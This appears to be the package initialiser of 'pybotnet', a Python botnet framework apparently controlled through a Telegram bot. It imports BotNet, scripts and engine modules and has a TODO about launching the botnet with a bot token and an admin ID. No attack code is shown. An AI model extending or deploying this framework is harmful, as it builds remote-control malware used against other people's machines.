__version__ = "2.0.1"
__github_link__ = "https://github.com/onionj/pybotnet"


from .botnet import BotNet as BotNet
from .botnet import ExternalScripts as ExternalScripts
from .request import Request as Request
from .exceptions import UserException, EngineException
from .scripts import *
from .engines import *
from .utils import proxy

# TODO add code to run botnet by `python -m pybotnet Telegram-Bot-Token Admin-ID`
